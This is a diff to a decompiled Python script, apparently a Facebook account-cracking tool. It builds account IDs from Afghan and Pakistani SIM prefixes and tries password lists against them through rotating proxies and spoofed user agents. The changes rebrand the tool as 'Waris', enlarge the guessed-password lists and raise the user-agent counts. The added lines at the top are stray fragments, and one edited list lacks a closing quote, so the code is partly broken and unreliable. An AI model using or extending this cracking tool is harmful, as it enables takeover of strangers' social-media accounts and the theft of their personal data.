@@ -1,3 +1,9 @@
+     time.sleep(1)
+      approval()
+  except:
+    sys.exit()
+    
+riaz() 
 # Decompile by Mardis (Tools By Kapten-Kaizo)
 # Time Succes decompile : 2023-02-07 00:26:14.084668
 from os import path
@@ -50,7 +56,7 @@ try:
 	prox= requests.get('https://raw.githubusercontent.com/ahmad77412/axi/main/.prox.txt').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
-	print('\x1b[1;95m[√] LOADING...')
+	print('\x1b[1;95m[Waris] LOADING...')
 	
 prox=open('.prox.txt','r').read().splitlines()
 
@@ -75,7 +81,7 @@ for xd in range(5000):
 	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
 	ugen.append(uaku2)
 
-for agent in range(10000):
+for agent in range(100000):
         aa='Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
         b=random.choice(['6','7','8','9','10','11','12'])
         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
@@ -91,7 +97,7 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 
-for xd in range(10000):
+for xd in range(100000):
 	a='Mozilla/5.0 (Symbian/3; Series60/','Mozilla/5.0 (Linux; U; Android','Mozilla/5.0 (Linux; Android 6.0.1;','Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
 	b=random.randrange(1, 9)
 	c=random.randrange(1, 9)
@@ -124,7 +130,7 @@ for xd in range(10000):
 	
 
 logo=("""
-\033[1;97m ░██╗░░░░░░░██╗░█████╗░██████╗░██╗░██████╗
+\033[1;97m░██╗░░░░░░░██╗░█████╗░██████╗░██╗░██████╗
 ░██║░░██╗░░██║██╔══██╗██╔══██╗██║██╔════╝
 ░╚██╗████╗██╔╝███████║██████╔╝██║╚█████╗░
 ░░████╔═████║░██╔══██║██╔══██╗██║░╚═══██╗
@@ -220,8 +226,8 @@ def m1():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Afghan] Example  : 070,079,078,077')
-    print('\x1b[1;92m[DAWOODZAI] See Note : PUT YOUR SIM CODE ')
+    print('[Waris] Example  : 070,079,078,077')
+    print('\x1b[1;92m[Waris] See Note : PUT YOUR SIM CODE ')
     lines()
     kode = input('[WARIS] Your Code : ')
     lines()
@@ -245,7 +251,7 @@ def m1():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','12345677','kandahar123','javid123','@#123456','0800900','tahir123','noorkhan','haqmal12','hikmatkhan','khostai','qwerty','facebook']
+            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','12345677','kandahar123','۱۱۲۲۳۳','600700','60007000','10009000','100200','300300','0700800','667788','0987654','987654','500600','123455','643739','6429585','252526','786776','112233','kabul1234','Kabul1234','kandaharr','kandahar1233','nasib123','love123','bilal123','farwiz123','waris1234','111222','khan113','khan123','herat123']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -257,14 +263,14 @@ def m2():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Waris] Example  : 070,078,077,****Etc')
+    print('[Waris] Example  : 070,078,077,****etc')
     print('\x1b[1;92m[Waris] See Note : PUT YOUR SIM CODE ')
     lines()
     kode = input('[Waris] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[Waris] Example  : 5000,100000,10000')
+    print('[Waris] Example  : 5000,10000,100000')
     print('\x1b[1;92m[Waris] See Note : PUT LEMIT ')
     lines()
     limit = int(input('[Waris] Idz Lemit : '))
@@ -282,7 +288,7 @@ def m2():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123','khan123','mansoor','jano123']
+            pwx=[guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','12345677','kandahar123','۱۱۲۲۳۳','600700','60007000','10009000','100200','300300','0700800','667788','0987654','987654','500600','123455','643739','6429585','252526','786776','112233','kabul1234','Kabul1234','kandaharr','kandahar1233','nasib123','love123','bilal123','farwiz123','waris1234','111222','khan113','khan123','herat123']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -294,14 +300,14 @@ def m3():
     user=[]
     os.system('clear')
     print(logo)
-    print('[Waris] Example  : 9370,9378,9377,****Etc')
+    print('[Waris] Example  : 9370,9378,9377,****etc')
     print('\x1b[1;92m[+] See Note : PUT YOUR SIM CODE ')
     lines()
     kode = input('[Waris] Your Code : ')
     lines()
     os.system('clear')
     print(logo)
-    print('[Waris] Example  : 2000,3000,5000,Afghan')
+    print('[Waris] Example  : 2000,3000,5000,Waris')
     print('\x1b[1;92m[Waris] See Note : PUT LEMIT ')
     lines()
     limit = int(input('[Waris] Idz Lemit : '))
@@ -319,7 +325,7 @@ def m3():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','Afghan12345','kabul123','Ahmad123','javid123','khan123','070000','778899']
+            pwx=[guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','12345677','kandahar123','۱۱۲۲۳۳','600700','60007000','10009000','100200','300300','0700800','667788','0987654','987654','500600','123455','643739','6429585','252526','786776','112233','kabul1234','Kabul1234','kandaharr','kandahar1233','nasib123','love123','bilal123','farwiz123','waris1234','111222','khan113','khan123','herat123']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -340,7 +346,7 @@ def b1():
     os.system('clear')
     print(logo)
     print('[Waris] Example  : 2000,3000,5000,10000')
-    print('\x1b[1;91m[+] See Note : PUT LEMIT ')
+    print('\x1b[1;91m[Waris] See Note : PUT LEMIT ')
     lines()
     limit = int(input('[Waris] YOUR LEMIT : '))
     print(46*'-')
@@ -357,7 +363,7 @@ def b1():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,kode,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar','badrai123','khalid1122']
+            pwx=[guru,kode,'pakistan','khankhan','khan123','malik123','Ahmad123','karachi123','pikhawar','badrai123','khalid1122]
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -457,7 +463,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mWaris\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mWaris\033[1;97m] %s|\33[1;32mWarisOK:- %s \r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
